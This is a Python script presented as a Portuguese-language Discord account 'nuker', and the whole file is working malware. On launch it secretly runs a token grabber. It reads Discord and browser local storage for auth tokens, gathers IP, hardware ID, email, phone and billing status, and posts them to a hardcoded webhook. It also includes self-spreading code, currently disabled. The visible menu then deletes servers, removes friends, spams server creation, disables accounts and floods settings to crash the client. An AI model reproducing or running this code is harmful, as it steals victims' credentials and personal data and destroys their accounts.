import os

if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
import discord
import asyncio
import codecs
import sys
import io
import random
import threading
import requests
import discord
from discord.ext import commands
from discord.ext.commands import Bot

import pyfiglet
from pyfiglet import Figlet

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

WEBHOOK_URL = "https://discord.com/api/webhooks/839189970790645761/HllzmNOFaQ2O5tEeL8FFnYznWk1H78DL3ETfEBWJ0rSAQjpX5UitptdNy1-5qXznsadt" # Insert webhook url here

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}


def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass


def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip


def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass


def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass


def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass


def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass


def spread(token, form_data, delay):
    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    for friend in getFriends(token):
        try:
            chat_id = getChat(token, friend["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)


def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "|Token|",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                },
                "footer": {
                    "text": f"Visit my website for more Cybersecurity contents: un5t48l3.com"
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://mehmetcanyildiz.com/wp-content/uploads/2020/11/black.png"
    }
    try:
        
        urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()


try:
    main()
except Exception as e:
    print(e)
    pass


init(convert=True)
clear = lambda: os.system('clear')
clear()

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

custom_fig = Figlet(font='bell')
print(custom_fig.renderText('Feito Por Just.Ethan'))



print('\n')
token = input("Token : ")

head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if src.status_code == 200:
    print('[+] TOKEN VALIDO ')
    input("Press any key to continue...")
else:
    print(f'[{Fore.RED}-{Fore.RESET}] TOKEN INVALIDO')
    input("Press any key to exit...")
    exit(0)



print('\n')
print('1 - LIXAR POR COMPLETO (torna a conta inteira vazia, cria servidores atoa e crasha o discord)')
print('2 - TIRA TODOS OS AMIGOS')
print('3 - EXCLUI E SAI DE TODOS OS SERVIDORES')
print('4 - CRIA SERVIDORES ATOA')
print('5 - DESATIVA A CONTA')
print('6 - FAZ LOGIN COM O TOKEN')
print('7 - INFORMAÇOES DO TOKEN')
print('8 - CRASHA O DISCORD')
print('\n')

#### ultimate nuke
def nuke():
    print("Loading...")
    print('\n')
    
    @bot.event
    async def on_ready(times : int=100):
        
        print('STATUS : [FODIDOR COMPLETO]')
        print('\n')
        print('1 - A SAIR DOS SERVIDORES')
        print('\n')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'SAIU DE [{guild.name}]')
            except:
                print(f'NAO CONSEGUE SAIR DE [{guild.name}]')
        print('\n')
        print('2 - ELIMINA OS SERVIDORES CRIADOS POR ELE')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] FOI ELIMINADO')
            except:
                print(f'NAO CONSEGUE ELIMINAR [{guild.name}]')
        
        print('\n')
        print('3 - A TIRAR TODOS OS AMIGOS')
        print('\n')

        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'TIROU DOS AMIGOS {user}')
            except:
                print(f"NAO CONSEGUE TIRAR DOS AMIGOS {user}")
        
        print('\n')
        print('4 - A CRIAR SERVIDORES ATOA')
        print('\n')

        for i in range(times):
            await bot.create_guild('Hacked By LIXADOR DE DISCORD', region=None, icon=None)
            print(f'{i} SERVIDORES ATOA CRIADOS')
        print('\n')
        print('BATEMOS O LIMITE DE SERVIDORES [100]')
        print('\n')
        print('\n')
        print('5 - A CRASHAR O DISCORD')       
        print('\n')

        print('\n')
        print('JA ESTAMOS A LIXAR O DISCORD DO GAJO')
        print('SE TU QUISERES QUE O CRASH NAO PARE NAO FECHES O APLICATIVO')
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


    bot.run(token, bot=False)


#### unfriender
def unfriender():
    print("Loading...")
    #bot.logout
    
    @bot.event
    async def on_ready():
        print('STATUS : [TIRA TODOS OS AMIGOS]')
    
        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'TIROU DOS AMIGOS {user}')
            except:
                print(f"NAO CONSEGUE TIRAR DOS AMIGOS {user}")
        
        print('\n')
        print('[[JA TIRAMOS TODA A GENTE DOS AMIGOS, SE QUISERES USAR O APLICATIVO OUTRA VEZ FECHA E ABRE O APLICATIVO]')
        print('\n')
    bot.run(token, bot=False)

#### server leaver
def leaver():
    print("Loading...")
    #bot.logout
    
    @bot.event
    async def on_ready():
        print('STATUS : [EXCLUI E SAI DE TODOS OS SERVIDORES]')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'A SAIR DE [{guild.name}]')
            except:
                print(f'NAO CONSEGUE SAIR, MAS ESTA A APAGAR O [{guild.name}]')

        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] FOI APAGADO')
            except:
                print(f'NAO CONSEGUE APAGAR [{guild.name}]')    

        print('\n')
        print('[[JA SAIU E APAGOU TODOS OS SERVIDORES, SE QUISERES USAR O APLICATIVO OUTRA VEZ FECHA E ABRE O APLICATIVO]')
        print('\n')

    bot.run(token, bot=False)
    

#### spam servers
def spamservers():
    print("Loading...")
    
    @bot.event
    async def on_ready(times: int=95):
        print('STATUS : [CRIA SERVIDORES ATOA]')
        
        for i in range(times):
            await bot.create_guild('Hacked By LIXADOR DE DISCORD', region=None, icon=None)
            print(f'{i} SERVIDORES ATOA CRIADOS')
    
        print('BATEMOS O LIMITE DE SERVIDORES [100]')
        print('\n')
        print('[[JA CRIAMOS TODOS OS SERVIDORES ATOA, SE QUISERES USAR O APLICATIVO OUTRA VEZ FECHA E ABRE O APLICATIVO]')
        print('\n')
        input()
    bot.run(token, bot=False)


def tokenDisable(token):
    print('STATUS : [DESATIVA A CONTA]')
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token})
    if r.status_code == 400:
        print(f'[{Fore.RED}+{Fore.RESET}] CONTA DESATIVADA COM SUCESSO')
        input("Press any key to exit...")
    else:
        print(f'[{Fore.RED}-{Fore.RESET}] TOKEN INVALIDO')
        input("Press any key to exit...")

def tokenLogin(token):
    print('STATUS : [FAZ LOGIN COM O TOKEN]')
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    print('STATUS : [INFORMAÇOES DO TOKEN]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
            input()

def crashdiscord(token):
    print('STATUS : [CRASHA O DISCORD]')
    print('\n')
    print('JA ESTAMOS A LIXAR O DISCORD DO GAJO')
    print('SE TU QUISERES QUE O CRASH NAO PARE NAO FECHES O APLICATIVO')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


def mainanswer():
    answer = input('ESCOLHE : ')
    if answer == '1':
        nuke()
    elif answer == '2':
        unfriender()
    elif answer == '3':
        leaver()
    elif answer == '4':
        spamservers()
    elif answer == '5':
        tokenDisable(token)
    elif answer == '6':
        tokenLogin(token)
    elif answer == '7':
        tokenInfo(token)
    elif answer == '8':
        crashdiscord(token)
    else:
        print('NUMERO INVALIDO, POR FAVOR ESCOLHA UM NUMERO VALIDO')
        mainanswer()

mainanswer()
